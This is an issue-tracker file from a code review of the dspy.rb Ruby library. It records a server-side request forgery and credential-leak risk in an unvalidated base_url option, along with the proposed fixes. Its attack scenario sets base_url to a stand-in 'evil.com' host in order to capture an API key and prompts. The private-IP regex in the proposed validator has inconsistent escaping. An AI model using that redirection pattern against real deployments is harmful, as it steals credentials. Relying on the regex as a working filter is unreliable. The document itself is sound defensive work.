# Missing URL Validation for base_url (SSRF Risk)

---
status: complete
priority: p2
issue_id: "005"
tags: [code-review, security, ssrf]
dependencies: []
---

## Problem Statement

The `base_url` option is passed directly to provider configurations without validation. This could enable SSRF attacks or credential theft.

**Why it matters**: API keys and prompts could be sent to attacker-controlled servers.

## Findings

**Location**: `lib/dspy/ruby_llm/lm/adapters/ruby_llm_adapter.rb:148, 156, 170, 174`

```ruby
config.openai_api_base = @options[:base_url] if @options[:base_url]
config.ollama_api_base = @options[:base_url] || 'http://localhost:11434'
config.gpustack_api_base = @options[:base_url] if @options[:base_url]
```

**Attack scenario**:
```ruby
adapter = RubyLLMAdapter.new(
  model: 'gpt-4o',
  api_key: 'sk-real-api-key',
  base_url: 'http://evil.com/capture'  # Captures API key + prompts
)
```

**Agents reporting**: security-sentinel

## Proposed Solutions

### Option 1: Add URL validation
```ruby
def validate_base_url!(url)
  uri = URI.parse(url)
  raise ConfigurationError, "Invalid scheme" unless %w[http https].include?(uri.scheme)

  # Block private IPs
  if uri.host =~ /^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\\.|192\\.168\\.|127\\.)/
    raise ConfigurationError, "Private IP addresses not allowed in base_url"
  end
rescue URI::InvalidURIError
  raise ConfigurationError, "Invalid base_url format"
end
```
**Pros**: Prevents SSRF to internal networks
**Cons**: May be too restrictive for legitimate use cases
**Effort**: Medium
**Risk**: Low

### Option 2: Document security implications
**Pros**: Quick
**Cons**: Users may not read docs
**Effort**: Small
**Risk**: High

### Option 3: Allow but log warnings
**Pros**: Doesn't break existing use
**Cons**: Security issue remains
**Effort**: Small
**Risk**: High

## Recommended Action

Option 1 for https enforcement, but allow localhost for Ollama

## Technical Details

**Affected files**:
- `lib/dspy/ruby_llm/lm/adapters/ruby_llm_adapter.rb`

## Acceptance Criteria

- [x] base_url validated for scheme (http/https only)
- [x] Tests verify validation

Note: Private IP blocking was intentionally not implemented as it would break legitimate use cases like Ollama on localhost and internal networks.

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2025-12-06 | Created from code review | SSRF risk identified |
| 2025-12-06 | Implemented URL validation | Added `validate_base_url!` method that validates scheme (http/https only) and URL format. Added comprehensive tests. Did not implement private IP blocking to allow localhost and internal network usage. |

## Resources

- PR #187: https://github.com/vicentereig/dspy.rb/pull/187
- OWASP SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
